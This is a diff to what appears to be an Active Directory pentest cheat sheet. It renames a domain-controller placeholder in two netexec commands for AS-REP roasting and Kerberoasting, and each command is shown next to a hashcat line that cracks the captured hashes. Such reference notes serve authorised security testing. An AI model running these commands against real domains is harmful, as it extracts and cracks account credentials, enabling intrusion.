@@ -9,7 +9,7 @@ tags: [ad, kerberos, asrep, kerberoast, hashcat]
 Requires a known username with Kerberos preauthentication disabled. Empty password requests an unauthenticated check.
 
 ```bash
-nxc ldap {{DC}} -d '{{DOMAIN}}' -u '{{USER}}' -p '' --asreproast asrep.txt
+nxc ldap {{DC01}} -d '{{DOMAIN}}' -u '{{USER}}' -p '' --asreproast asrep.txt
 hashcat -m 18200 asrep.txt wordlist.txt
 ```
 
@@ -20,7 +20,7 @@ Prepare wordlist.txt locally. Mode 18200 applies to etype 23 output only. [Sourc
 Requires domain authentication and an eligible account with an SPN.
 
 ```bash
-nxc ldap {{DC}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' --kerberoasting tgs.txt
+nxc ldap {{DC01}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' --kerberoasting tgs.txt
 hashcat -m 13100 tgs.txt wordlist.txt
 ```
 
